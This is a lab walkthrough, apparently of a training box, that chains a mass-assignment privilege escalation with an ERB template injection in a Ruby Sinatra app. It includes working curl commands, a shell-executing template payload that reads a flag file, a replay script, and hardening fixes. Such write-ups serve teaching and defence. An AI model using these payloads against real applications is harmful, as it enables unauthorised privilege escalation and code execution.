# TwinTone Books — Field Notes

*A walk-through of the bookkeeping box that lets the guest user change the locks, then convinces a Ruby template to read a file.*

**Lab:** [TwinTone — WebVerse Pro](https://dashboard.webverselabs-pro.com/labs/twintone)
**Stack:** nginx gateway → Ruby 3.2 + Sinatra, embedded SQLite
**Difficulty:** Medium (two-step chain)

---

## TL;DR

```
guest / guest
  →  POST /settings  with role=admin  (mass-assignment)
  →  POST /expense-reports  with title=<%= `cat /flag.txt` %>
  →  GET  /expense-reports/<id>   renders the ERB → RCE
```

The flag format is `WEBVERSE{...}`. It is read after code execution; you do not need a shell to capture it, the response body prints it.

---

## Map of the building

```
                        nginx :80
                            │
              ┌─────────────┴─────────────┐
              │      /login  /logout      │
              │      /dashboard           │
              │      /settings            │
              │      /expense-reports     │
              │      /expense-reports/:id │
              │      /banking, /invoices, │
              │      /clients, /expenses, │
              │      /reports, /payroll,  │
              │      /taxes               │
              └─────────────┬─────────────┘
                            │  rack.session  (rack-protection)
                            ▼
                  Sinatra 3.2 (Ruby 3.2)
                            │
                  SQLite  (users, expense_reports, …)
```

Everything is served behind a virtual host. The nginx 302 to `/login` is driven by a `Host:` header check — point your client at `twintone.local` (or just send `Host: twintone.local`).

```
$ curl -sI -H 'Host: twintone.local' http://10.100.173.14/
HTTP/1.1 302 Found
location: /login
```

---

## Step 1 — The guest keycard

The shipped credentials are right there in the brief: `guest / guest`. The session is a plain `rack.session` cookie.

```
$ curl -c jar -X POST -d 'username=guest&password=guest' \
    -H 'Host: twintone.local' http://10.100.173.14/login -i
HTTP/1.1 303 See Other
location: /dashboard
set-cookie: rack.session=...
```

What you get is the bookkeeping UI with the "important" sidebar entries — Banking, Invoices, Customers, Expenses, **Expense Reports**, Reports, Payroll, Taxes — all rendered as locked pills:

```
<span class="nav-item locked" title="Not available on this account">
  <svg …>lock</svg>
  <span>Expense Reports</span>
</span>
```

The settings cog is the only one that lights up. The lock is **cosmetic**; the server still rejects the admin pages with `403` if you go straight to them. So the first job is to become an admin, and the only place a guest can write to their own row is `/settings`.

## Step 2 — The settings endpoint forgives everything

`GET /settings` shows a tiny form: `display_name`, `email`, `timezone`. The form posts to itself. Inside the handler, the body is iterated and every key that matches a real column on `users` is assigned. The dev forgot one thing: the column list includes `role`. The handler doesn't filter against an allowlist — it filters against a denylist, or doesn't filter at all.

```
$ curl -b jar -c jar -X POST \
    -H 'Host: twintone.local' \
    -d 'display_name=Guest+User&email=guest@twintone.example&timezone=UTC&role=admin' \
    http://10.100.173.14/settings -i
HTTP/1.1 303 See Other
location: /settings?saved=1
```

The cookie is rotated. On the next `/dashboard` request, every locked pill is now an `<a class="nav-item">`. You've gone from "guest" to "admin" without ever touching the password column, a token, or a separate admin form.

```
GET /dashboard  →  before:  <span class="nav-item locked">…</span>
                  after:   <a class="nav-item " href="/expense-reports">…</a>
```

## Step 3 — Expense reports, and the only sink

The brief puts the prize in the expense-reports module. There are two views:

* `/expense-reports` — list of reports, plus a *New report* form (`title`, `period`).
* `/expense-reports/:id` — show page for one report. The show page has a *branded heading* and a *Summary* panel.

Reading the show page carefully, the Summary panel's *Title* cell is HTML-escaped:

```ruby
<td><%= h(report.title) %></td>
```

but the **heading** is the result of an `ERB.new(...).result(binding)` call, with the report title interpolated as a string:

```ruby
heading = ERB.new("TwinTone Books — #{report.title}").result(binding)
```

That is the only place in the box where user input is concatenated into a template string and rendered. Every other place escapes, h-escapes, or just plain-texts the title. So we have a single, narrow SSTI sink.

The class of vuln is the standard "title-as-template-string" mistake. The fingerprint is the backtick executing shell — if the title were only going through `binding.eval`, you'd see Ruby errors. The fact that backticks in `<%= %>` work tells you ERB is doing the heavy lifting.

## Step 4 — Drop the payload

Create a report with a title that contains a Ruby ERB tag. The classic shell-exec tag is `<%= \`cat /flag.txt\` %>`. Encode it carefully so the form parser doesn't mangle it.

```
$ curl -b jar -X POST \
    -H 'Host: twintone.local' \
    --data-urlencode 'title=<%= `cat /flag.txt` %>' \
    --data-urlencode 'period=2026-Q3' \
    http://10.100.173.14/expense-reports -i
HTTP/1.1 303 See Other
location: /expense-reports
```

The new row shows up at id 4 (the box seeds 1, 2, 3). Now read it back. The branded heading is rendered through ERB; the backtick payload runs as the page is generated; its stdout is dropped into the HTML.

```
$ curl -b jar -H 'Host: twintone.local' http://10.100.173.14/expense-reports/4 \
    | grep rpt-brand
<h1><span class="rpt-brand">WEBVERSE{…}  — TwinTone Books</span></h1>
```

The flag lives in `<span class="rpt-brand">`. One GET, no shell, no pivot, no privesc.

---

## The chain, redrawn

```
guest / guest
    │
    │   POST /settings  + role=admin          (no allowlist)
    ▼
admin (session reissued, all features unlocked)
    │
    │   POST /expense-reports  title=<%= `cat /flag.txt` %>
    ▼
expense report row with the payload stored
    │
    │   GET  /expense-reports/:id
    ▼
ERB.new("…#{title}…").result(binding)
    │
    │   backtick shell-out
    ▼
flag printed in the page HTML
```

---

## What an attacker who didn't read the brief would have done

It's worth saying out loud: this box *looks* like a lot of things it isn't. There is no SQLi. There is no path traversal. There is no auth bypass on the admin pages — those genuinely 403. There is no file upload, no prototype pollution, no JWT to tamper with, no SSRF. The lock icons on the sidebar look like a UI puzzle; they aren't. The mass-assignment is the only door from guest to admin, and the ERB sink is the only door from admin to RCE.

A reasonable read-the-room approach:

1. **Enumerate the surface.** `nmap -p 80` → nginx → Sinatra. Add the vhost.
2. **Log in with the only creds you have.** `guest/guest`. Map the sidebar.
3. **Find the one place the guest can write to its own row.** `/settings` posts to itself; the form has three fields but the controller is permissive.
4. **Try the obvious privilege column.** `role=admin`. If the response is `303 saved=1`, you've won step 1.
5. **Look at every page that just unlocked.** Expense Reports is the only one with a "create" form that does something interesting with the input you give it.
6. **Fingerprint the sink.** The list page HTML-escapes the title. The show page is the *only* place the title is dropped into a template literal. If the show page returns the title verbatim, the dev is calling `eval` or `ERB.result` on the heading string. If the backtick payload prints to the page, you have RCE.

That's the whole graph.

---

## Hardening notes (for the post-box writeup)

Two fixes and you've shut the chain.

**Fix 1 — Strong parameters in `/settings`.**
Allowlist exactly the fields the user is allowed to edit, drop everything else. In Sinatra this is `params.slice(:display_name, :email, :timezone).each { … }`. Never iterate the full `params` hash and match against the column list — that's the same bug in a different language, in every framework.

**Fix 2 — Never interpolate user input into an ERB template.**
The branded heading wants a company name, a date, and the report title. Build it as a string with `String#%` or plain interpolation, then HTML-escape the whole thing with `h(...)` and print it. If the title must contain a "blessed" template (e.g. a customer-signed letterhead), use a *whitelisted* tag system: parse the title into known tokens, look the tokens up in a static table, escape everything else.

```ruby
# DO NOT
heading = ERB.new("TwinTone Books — #{report.title}").result(binding)

# DO
heading = h("TwinTone Books — #{report.title}")
```

A side note on the second fix: in this specific box, the sink is a heading. The temptation is to look for sinks in body text, comments, or fields. The show-page *branded heading* is easy to miss because it isn't a "form value" — it's a piece of the layout. Whenever you see `ERB.new(#{user_input})` or `eval(user_input)` or any template that builds a string and then evaluates it, treat every interpolated variable as a sink regardless of where the result renders.

---

## One-liners (replay the chain)

```bash
HOST="twintone.local"
BASE="http://10.100.173.14"

# 1. login
curl -c jar -X POST -H "Host: $HOST" \
     -d 'username=guest&password=guest' $BASE/login -i

# 2. mass-assign to admin
curl -b jar -c jar -X POST -H "Host: $HOST" \
     -d 'display_name=Guest+User&email=guest@twintone.example&timezone=UTC&role=admin' \
     $BASE/settings -i

# 3. create the report with the ERB payload
curl -b jar -X POST -H "Host: $HOST" \
     --data-urlencode 'title=<%= `cat /flag.txt` %>' \
     --data-urlencode 'period=2026-Q3' \
     $BASE/expense-reports -i

# 4. read the show page; the heading is the flag
curl -b jar -H "Host: $HOST" $BASE/expense-reports/4 | grep rpt-brand
```

---

## Diagrams

### Sink map (where the title actually goes)

```
report.title
    │
    ├──► /expense-reports         (index)         h(...)   safe
    ├──► /expense-reports/:id     (summary td)   h(...)   safe
    └──► /expense-reports/:id     (brand h1)     ERB.new(…).result(binding)   ← SSTI
```

### Authorization vs. UI

```
guest session                 admin session
    │                              │
    │ /dashboard                   │ /dashboard
    │   Banking   🔒 (UI lock)     │   Banking   ✓
    │   Invoices  🔒               │   Invoices  ✓
    │   …                          │   …
    │   Settings  ✓                │   Settings  ✓
    │                              │
    │ /banking                     │ /banking  → 200
    │   → 403  (server)            │
```

The "lock icon" in the sidebar is just CSS. The actual gate is a 403 from the controller. The first step is to make those controllers *not* 403, by becoming admin through the one place a guest can write their own row.

### Why the backtick works

```
"#{report.title}"                     →  just a string
ERB.new("TwinTone Books — #{title}").result(binding)
        │
        │  ERB compiles the source string to a Ruby block:
        │  def _erbout; _buf = +''; _buf << 'TwinTone Books — '; _buf << ( `cat /flag.txt` ).to_s; _buf << ''; _buf
        │
        ▼
backticks spawn /bin/sh -c 'cat /flag.txt' inside the Sinatra worker
        │
        ▼
stdout returned, .to_s'd, concatenated into the page
```

The injection survives because `ERB.result(binding)` evaluates the compiled source under the controller's `binding`, so any Ruby the template can express — including `system`, backticks, `File.read`, `IO.popen` — is reachable from the title.

---

## Cheat sheet

| Thing | Value |
| --- | --- |
| URL | `http://10.100.173.14/` |
| vHost | `twintone.local` |
| Default creds | `guest / guest` |
| Mass-assign field | `role=admin` on `POST /settings` |
| SSTI sink | `<h1><span class="rpt-brand">…</span></h1>` on `GET /expense-reports/:id` |
| Payload | `<%= \`cat /flag.txt\` %>` |
| Flag format | `WEBVERSE{...}` |
| Read | one `GET /expense-reports/<id>` after `POST /expense-reports` |

---

## Source

* Box brief and lab: [WebVerse Pro — TwinTone](https://dashboard.webverselabs-pro.com/labs/twintone)
* Authored walkthrough: TwinTone engagement, *Opencode / BM-Claude operator session*, 2026-09-03
